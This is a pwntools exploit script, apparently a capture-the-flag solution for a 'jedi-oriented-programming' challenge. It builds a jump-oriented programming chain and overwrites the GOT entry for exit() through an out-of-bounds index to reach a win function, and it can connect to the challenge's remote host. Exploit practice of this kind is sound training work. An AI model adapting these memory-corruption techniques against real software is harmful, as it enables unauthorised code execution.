from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)

gs = '''
break *0x40120f
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    if args.REMOTE:
        return remote("spaceheroes-jedi-oriented-programming.chals.io", 443, ssl=True, sni="spaceheroes-jedi-oriented-programming.chals.io")
    return process(e.path)

p = start()

def set_reg_to(reg,value,log_func):
    if log_func:
      log.info('Setting %s to 0x%x' %(reg,value))
    if value == 0:
        return b""
    payload = set_reg_to(reg,value >> 1,False)
    payload += p64(e.symbols['quote3']+0x10)
    if value & 1 == 1:
        payload += p64(e.symbols['quote6']+0x10)
    return payload

def build_jmp_table():
    log.info('Building Jump Table')
    jmp_tbl = p64(e.got['exit'])
    jmp_tbl += p64(e.symbols['quote4']+0x10)
    jmp_tbl += set_reg_to('rsi',0x73696465,True)
    jmp_tbl += p64(e.symbols['quote1']+0x10)
    jmp_tbl += p64(e.symbols['quote4']+0x10)
    jmp_tbl += set_reg_to('rdi',0x6461726b,True)
    jmp_tbl += p64(e.symbols['win'])
    p.sendlineafter(b">>>", jmp_tbl)

def oob_got_overwrite():
    log.info('Overwriting GOT entry for exit')
    offset = (0x400700-e.sym['review_names']) // 8
    p.sendlineafter(b">>>", str(offset).encode('utf-8'))
    p.sendlineafter(b">>>", p64(e.symbols['quote5']))

build_jmp_table()
oob_got_overwrite()
log.info('exit() triggers JOP')

p.interactive()
